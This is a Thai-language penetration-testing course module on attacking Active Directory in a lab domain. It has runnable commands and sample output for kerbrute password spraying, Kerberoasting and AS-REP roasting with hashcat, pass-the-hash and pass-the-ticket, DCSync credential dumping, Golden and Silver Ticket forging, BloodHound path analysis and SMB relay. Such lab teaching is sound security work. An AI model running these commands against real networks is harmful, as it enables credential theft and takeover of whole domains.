# Part 38: Active Directory Attacks - การโจมตีสุด AD

## สารบัญ
1. [Active Directory พื้นฐาน](#1-active-directory-พื้นฐาน)
2. [Enumeration - สำรวจ AD](#2-enumeration---สำรวจ-ad)
3. [Kerberoasting](#3-kerberoasting)
4. [AS-REP Roasting](#4-as-rep-roasting)
5. [Pass-the-Hash และ Pass-the-Ticket](#5-pass-the-hash-และ-pass-the-ticket)
6. [DCSync Attack](#6-dcsync-attack)
7. [Golden Ticket และ Silver Ticket](#7-golden-ticket-และ-silver-ticket)
8. [BloodHound - AD Attack Paths](#8-bloodhound---ad-attack-paths)
9. [LDAP และ SMB Attacks](#9-ldap-และ-smb-attacks)
10. [แบบฝึกหัด Lab](#10-แบบฝึกหัด-lab)

---

## 1. Active Directory พื้นฐาน

### AD Components หลัก

```
Active Directory Structure:

Forest
└── Domain (company.local)
    ├── Domain Controllers (DC)
    │   ├── dc01.company.local
    │   └── dc02.company.local
    ├── Organizational Units (OU)
    │   ├── IT Department
    │   ├── HR Department
    │   └── Management
    ├── Users
    │   ├── Administrator (RID 500)
    │   ├── Domain Admins
    │   └── Regular Users
    └── Computers
        ├── Workstations
        └── Servers
```

### Kerberos Authentication Flow

```
1. Client ขอ TGT (Ticket Granting Ticket) จาก KDC
   Client --> KDC: AS-REQ (username + encrypted timestamp)
   KDC --> Client: AS-REP (TGT encrypted with krbtgt hash)

2. Client ใช้ TGT ขอ Service Ticket
   Client --> KDC: TGS-REQ (TGT + SPN requested)
   KDC --> Client: TGS-REP (Service Ticket encrypted with service hash)

3. Client เข้าใช้ Service ด้วย Service Ticket
   Client --> Service: AP-REQ (Service Ticket)
   Service --> Client: AP-REP (service response)
```

### Lab Environment Setup

```bash
# ใน lab สมมติว่ามี:
# - DC: 192.168.1.1 (dc01.company.local)
# - Workstation: 192.168.1.10
# - Attacker: 192.168.1.100 (Kali)
# - Domain: COMPANY.LOCAL

# ตั้งค่า DNS ให้ชี้ไป DC
echo 'nameserver 192.168.1.1' > /etc/resolv.conf

# หรือเพิ่มใน /etc/hosts
echo '192.168.1.1 dc01.company.local company.local' >> /etc/hosts

# ทดสอบ connectivity
ping -c 3 192.168.1.1
nslookup company.local 192.168.1.1
```

---

## 2. Enumeration - สำรวจ AD

### เครื่องมือ Enumeration หลัก

```bash
# 1. Enum4linux-ng - SMB/LDAP enumeration
enum4linux-ng -A 192.168.1.1

# Output:
# ====================================
# | Nmap SMB scripts scan on ...
# ====================================
# [+] Found domain: COMPANY
# [+] Found OS: Windows Server 2019

# 2. CrackMapExec (CME) - Swiss army knife for AD
crackmapexec smb 192.168.1.0/24

# สำรวจด้วย credentials
crackmapexec smb 192.168.1.1 -u 'user1' -p 'password123' --users
crackmapexec smb 192.168.1.1 -u 'user1' -p 'password123' --groups
crackmapexec smb 192.168.1.1 -u 'user1' -p 'password123' --shares
crackmapexec smb 192.168.1.1 -u 'user1' -p 'password123' --pass-pol

# 3. LDAP Enumeration
ldapsearch -x -H ldap://192.168.1.1 -b 'DC=company,DC=local' -s sub '(objectclass=user)' sAMAccountName

# มี credentials
ldapsearch -x -H ldap://192.168.1.1 -D 'user1@company.local' -w 'password123' \
  -b 'DC=company,DC=local' '(objectclass=user)' sAMAccountName memberOf

# 4. RPCClient
rpcclient -U 'user1%password123' 192.168.1.1
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydominfo
rpcclient $> getdompwinfo
```

### kerbrute - Username Enumeration

```bash
# ดาวน์โหลด
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O kerbrute
chmod +x kerbrute

# สร้าง username list
cat > usernames.txt << 'EOF'
administrator
admin
service
it-admin
john.doe
jane.smith
sysadmin
helpdesk
EOF

# สำรวจ usernames ที่มีอยู่
./kerbrute userenum -d company.local --dc 192.168.1.1 usernames.txt

# Output:
# 2026/09/28 10:00:00 >  [+] VALID USERNAME:   administrator@company.local
# 2026/09/28 10:00:00 >  [+] VALID USERNAME:   john.doe@company.local
# 2026/09/28 10:00:00 >  [+] VALID USERNAME:   jane.smith@company.local

# Password spray
./kerbrute passwordspray -d company.local --dc 192.168.1.1 usernames.txt 'Company2024!'
```

### GetADUsers.py

```bash
# Impacket - สำรวจ users
impacket-GetADUsers -all -dc-ip 192.168.1.1 'company.local/user1:password123'

# Output:
# Name                  Email                           PasswordLastSet      LastLogon
# --------------------  ------------------------------  -------------------  -------------------
# Administrator         Administrator@company.local     2026-01-01 00:00:00  2026-09-28 09:00:00
# john.doe              john.doe@company.local          2026-03-15 10:00:00  2026-09-28 08:30:00
```

---

## 3. Kerberoasting

### หลักการ

```
Kerberoasting:
1. User (Domain Authenticated) ขอ Service Ticket สำหรับ SPN (Service Principal Name)
2. KDC ส่ง Service Ticket encrypted ด้วย service account's NTLM hash
3. Attacker นำ ticket ไป crack offline
4. ไม่ต้อง brute force AD หรือทำให้ alert!
```

### GetUserSPNs.py

```bash
# หา SPNs และดึง hashes
impacket-GetUserSPNs -dc-ip 192.168.1.1 'company.local/user1:password123' -request

# Output:
# ServicePrincipalName          Name      MemberOf  PasswordLastSet  LastLogon
# ----------------------------  --------  --------  ---------------  ---------
# MSSQL/db01.company.local      mssql_svc                           
# HTTP/web01.company.local      web_svc                             
# 
# $krb5tgs$23$*mssql_svc$COMPANY.LOCAL$MSSQL/db01.company.local@COMPANY.LOCAL*$abc123...
# $krb5tgs$23$*web_svc$COMPANY.LOCAL$HTTP/web01.company.local@COMPANY.LOCAL*$def456...

# บันทึกลงไฟล์
impacket-GetUserSPNs -dc-ip 192.168.1.1 'company.local/user1:password123' -request -outputfile kerberoast.txt

# Crack ด้วย hashcat
hashcat -m 13100 -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt

# -m 13100 = Kerberos 5 TGS-REP etype 23
# Output:
# $krb5tgs$23$*mssql_svc...$abc123...:MSSQLService2024!
```

### Rubeus (Windows)

```powershell
# บน Windows target (ถ้ามี foothold)
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Output:
# [*] Total kerberoastable users : 2
# [*] SamAccountName         : mssql_svc
# [*] ServicePrincipalName   : MSSQL/db01.company.local
# [*] Hash                   : $krb5tgs$23$*...

# ส่ง hashes.txt ไป crack บน Kali
```

---

## 4. AS-REP Roasting

### หลักการ

```
AS-REP Roasting:
- Users ที่ disable 'Require Kerberos preauthentication'
- Attacker ส่ง AS-REQ โดยไม่ต้องมี password
- KDC ส่ง AS-REP กลับมา encrypted ด้วย user's hash
- Crack offline
```

```bash
# หา users ที่ vuln
impacket-GetNPUsers -dc-ip 192.168.1.1 'company.local/user1:password123' -request

# Output:
# Name         MemberOf  PasswordLastSet  LastLogon  UAC
# -----------  --------  ---------------  ---------  --------
# nopreauth_user         2026-01-01       Never      0x410200
# 
# $krb5asrep$23$nopreauth_user@COMPANY.LOCAL:abcdef1234...

# หาโดยไม่ต้องมี credentials (ใช้ userlist)
impacket-GetNPUsers -dc-ip 192.168.1.1 company.local/ -usersfile usernames.txt -no-pass

# Crack ด้วย hashcat
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# -m 18200 = Kerberos 5 AS-REP etype 23
```

---

## 5. Pass-the-Hash และ Pass-the-Ticket

### Pass-the-Hash (PtH)

```bash
# ใช้ NTLM hash แทน password
# ทำงานเฉพาะกับ NTLM authentication

# Format: LM:NTLM
# LM ไม่ใช้แล้ว (aad3b435b51404eeaad3b435b51404ee)
# NTLM = hash จริง

# impacket-psexec
impacket-psexec -hashes 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' \
  administrator@192.168.1.10

# impacket-wmiexec
impacket-wmiexec -hashes 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' \
  administrator@192.168.1.10 'whoami'

# impacket-smbexec
impacket-smbexec -hashes 'aad3b435b51404eeaad3b435b51404ee:HASH' administrator@192.168.1.10

# CrackMapExec PtH
crackmapexec smb 192.168.1.0/24 -u administrator \
  -H '8846f7eaee8fb117ad06bdd830b7586c' --exec-method smbexec -x 'whoami'

# crackmapexec สำรวจทั้ง subnet
crackmapexec smb 192.168.1.0/24 -u administrator \
  -H 'NTLM_HASH' --continue-on-success
```

### Pass-the-Ticket (PtT)

```bash
# อ้างอิง Kerberos ticket แทน password/hash

# บน Windows - export ticket ด้วย Mimikatz
# sekurlsa::tickets /export
# หรือ Rubeus
# .\Rubeus.exe dump /nowrap

# ดึง ticket จาก compromised machine (meterpreter)
meterpreter > load kiwi
meterpreter > kerberos_ticket_list
meterpreter > kerberos_ticket_use /path/to/ticket.kirbi

# impacket - pass ticket
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass administrator@dc01.company.local

# ใช้ ticket
klist  # ดู tickets
```

### Overpass-the-Hash

```bash
# ใช้ NTLM hash เพื่อเริ่ม Kerberos authentication

# impacket-getTGT
impacket-getTGT 'company.local/administrator' -hashes ':NTLM_HASH' -dc-ip 192.168.1.1

# Output:
# [*] Saving ticket in administrator.ccache

export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass 'company.local/administrator@dc01.company.local'

# Rubeus (Windows)
# .\Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt
```

---

## 6. DCSync Attack

### หลักการ

```
DCSync:
- สมมติตัวเองเป็น Domain Controller
- เรียกใช้ MS-DRSR protocol (เหมือน DC ไปขอ sync)
- ดึง password hashes ทุก account จาก NTDS.dit
- ต้องการ: GetChanges และ GetChangesAll บน domain object
  (Domain Admin, Enterprise Admin, หรือกำหนด manually)
```

```bash
# impacket-secretsdump - DCSync
impacket-secretsdump -dc-ip 192.168.1.1 'company.local/administrator:password@192.168.1.1'

# Output:
# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1af21e5d74de8eaffebd6f24a42cc1b7:::
# john.doe:1103:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::

# บันทึก hashes
impacket-secretsdump -dc-ip 192.168.1.1 'company.local/administrator:password@192.168.1.1' \
  | tee all_hashes.txt

# Mimikatz (Windows)
# lsadump::dcsync /domain:company.local /all
# lsadump::dcsync /domain:company.local /user:krbtgt
```

---

## 7. Golden Ticket และ Silver Ticket

### Golden Ticket

```
Golden Ticket:
- Forged TGT ที่ sign ด้วย krbtgt hash
- สามารถ access ทุกอย่างใน domain
- อยู่ได้ 10 ปี (หรือ สมมติอายุเท่าไหร่ก็ได้)
- ต้องการ: krbtgt NTLM hash + Domain SID
```

```bash
# ขั้นที่ 1: ได้รับ krbtgt hash (DCSync)
impacket-secretsdump -dc-ip 192.168.1.1 'company.local/administrator:password@192.168.1.1' \
  | grep krbtgt
# krbtgt:502:aad3b435...:1af21e5d74de8eaffebd6f24a42cc1b7:::

# ขั้นที่ 2: ได้รับ Domain SID
impacket-getPac -dc-ip 192.168.1.1 'company.local/user1:password123'
# S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX

# หรือดูจาก whoami /user
rpcclient -U 'user1%password123' 192.168.1.1 -c 'lsaquery' | grep 'Domain Sid'

# ขั้นที่ 3: สร้าง Golden Ticket
impacket-ticketer \
  -nthash '1af21e5d74de8eaffebd6f24a42cc1b7' \
  -domain-sid 'S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX' \
  -domain 'company.local' \
  administrator

# Output: Saved ticket in administrator.ccache

# ขั้นที่ 4: ใช้งาน ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass 'company.local/administrator@dc01.company.local'

# Mimikatz (Windows)
# kerberos::golden /user:Administrator /domain:company.local \
#   /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt
```

### Silver Ticket

```bash
# Silver Ticket = Forged Service Ticket
# ใช้ service account hash (NTLM)
# Access เฉพาะ service นั้น
# นับเนื่องจากไม่เกี่ยวข้องกับ KDC จึง stealthy กว่า

# ต้องการ:
# - service account NTLM hash (eg: MSSQL service account)
# - Domain SID
# - SPN (Service Principal Name)

impacket-ticketer \
  -nthash 'MSSQL_SERVICE_ACCOUNT_HASH' \
  -domain-sid 'S-1-5-21-...' \
  -domain 'company.local' \
  -spn 'MSSQL/db01.company.local' \
  administrator

export KRB5CCNAME=administrator.ccache
impacket-mssqlclient -k db01.company.local
```

---

## 8. BloodHound - AD Attack Paths

### ติดตั้งและใช้งาน

```bash
# ติดตั้ง BloodHound
apt update && apt install bloodhound

# เริ่ม Neo4j database
neo4j start
# เปิด browser: http://localhost:7474
# Login: neo4j / neo4j -> เปลี่ยน password

# เริ่ม BloodHound GUI
bloodhound &

# เก็บข้อมูลด้วย SharpHound (กรณีมี foothold บน Windows)
# .\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# เก็บข้อมูลจาก Linux (python)
pip3 install bloodhound
bloodhound-python -u 'user1' -p 'password123' -d company.local -c all -ns 192.168.1.1

# Output:
# INFO: Found AD domain: company.local
# INFO: Connecting to LDAP server: dc01.company.local
# INFO: Found 1 domains
# INFO: Found 2 domain controllers
# INFO: Found 150 computers
# INFO: Found 500 users
# INFO: Done in 00M 45S

ls *.json
# 20260928100000_computers.json
# 20260928100000_domains.json
# 20260928100000_groups.json
# 20260928100000_users.json
```

### BloodHound Queries

```cypher
-- ใน BloodHound GUI, ใช้ Pre-built Queries:

-- Find all Domain Admins
MATCH p=(u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@COMPANY.LOCAL'}) RETURN p

-- Shortest path to Domain Admin
MATCH (n:User {name:'JOHN.DOE@COMPANY.LOCAL'}),
      (m:Group {name:'DOMAIN ADMINS@COMPANY.LOCAL'}),
      p=shortestPath((n)-[*1..]->(m)) RETURN p

-- Find all computers where admin
MATCH p=(u:User {name:'JOHN.DOE@COMPANY.LOCAL'})-[:AdminTo]->(c:Computer) RETURN p

-- Find users with DCSync rights
MATCH p=(n:User)-[:GetChanges|GetChangesAll*1..]->(d:Domain) RETURN p

-- Find Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames

-- Find AS-REP Roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u.name
```

---

## 9. LDAP และ SMB Attacks

### LDAP Null Session

```bash
# anonymous LDAP query
ldapsearch -x -H ldap://192.168.1.1 -b 'DC=company,DC=local'

# หา naming contexts
ldapsearch -x -H ldap://192.168.1.1 -s base namingContexts

# เก็บทุกอย่าง
ldapsearch -x -H ldap://192.168.1.1 -b 'DC=company,DC=local' '*' \
  | grep -E '(dn:|cn:|sAMAccountName:|mail:|description:)'
```

### Password Spray

```bash
# จำกัดการลอง (lockout policy)
# ดู lockout threshold ก่อน
crackmapexec smb 192.168.1.1 -u 'user1' -p 'password123' --pass-pol

# Output:
# Minimum password length: 7
# Password history length: 24
# Maximum password age: 42 days
# Account Lockout Threshold: 5 attempts
# Account Lockout Duration: 30 mins

# Spray (1 password ต่อ user ทุกคน)
crackmapexec smb 192.168.1.1 -u userlist.txt -p 'Company2024!' --continue-on-success
crackmapexec smb 192.168.1.1 -u userlist.txt -p 'Winter2024!' --continue-on-success
crackmapexec smb 192.168.1.1 -u userlist.txt -p 'P@ssw0rd' --continue-on-success

# kerbrute spray
./kerbrute passwordspray -d company.local --dc 192.168.1.1 userlist.txt 'Company2024!'

# หยุด 30 นาทีระหว่าง spray
sleep 1800 && crackmapexec smb 192.168.1.1 -u userlist.txt -p 'Spring2024!'
```

### SMB Relay Attack

```bash
# การเริ่มต้น
# 1. ปิด SMB และ HTTP ใน Responder
cat /etc/responder/Responder.conf
# SMB = Off
# HTTP = Off

# 2. เริ่ม Responder
responder -I eth0 -rdwv

# 3. เริ่ม ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'

# ทำงานอย่างไร:
# NBNS/LLMNR Poisoning -> capture NTLM -> relay ไป target
# ถ้า target ไม่มี SMB Signing -> ใช้งานได้

# ตรวจสอบ SMB signing
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
cat targets.txt
# 192.168.1.10  # signing=False

# Interactive shell
impacket-ntlmrelayx -tf targets.txt -smb2support -i
# [*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
nc 127.0.0.1 11000
```

---

## 10. แบบฝึกหัด Lab

### Lab 1: Kerberoasting Complete Workflow

```bash
# ประมวล environment:
# DC: 192.168.1.1 (COMPANY.LOCAL)
# User credentials: john.doe / Company2024!

# Step 1: Enumerate SPNs
impacket-GetUserSPNs -dc-ip 192.168.1.1 \
  'company.local/john.doe:Company2024!' \
  -request -outputfile kerberoast.txt

# Step 2: Crack hashes
hashcat -m 13100 -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.txt --show
# $krb5tgs$...:ServicePassword123

# Step 3: ใช้ credentials
crackmapexec smb 192.168.1.1 -u mssql_svc -p 'ServicePassword123'
```

### Lab 2: AS-REP Roasting

```bash
# หา AS-REP Roastable users
impacket-GetNPUsers -dc-ip 192.168.1.1 'company.local/' \
  -usersfile usernames.txt -no-pass -outputfile asrep.txt

# Crack
hashcat -m 18200 -a 0 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt --show
```

### Lab 3: BloodHound Analysis

```bash
# เก็บข้อมูล
 bloodhound-python -u 'john.doe' -p 'Company2024!' \
  -d company.local -c all -ns 192.168.1.1

# Upload ไป BloodHound GUI
# คลิกปุ่ม Upload Data

# ใช้ pre-built queries:
# - Find Shortest Paths to Domain Admins
# - Find All Kerberoastable Users
# - Find Principals with DCSync Rights
```

---

## สรุป

| Attack | เครื่องมือ | สิ่งที่ต้องการ |
|--------|-----------|----------------|
| Kerberoasting | GetUserSPNs.py | Domain user + SPN |
| AS-REP Roasting | GetNPUsers.py | Username list |
| Pass-the-Hash | psexec, wmiexec | NTLM hash |
| DCSync | secretsdump | Domain Admin/Replication rights |
| Golden Ticket | ticketer | krbtgt hash + Domain SID |
| BloodHound | bloodhound-python | Domain credentials |

---

**ต่อไป:** [Part 39 - Wireless Security Attacks](Part-39-Wireless-Security.md)
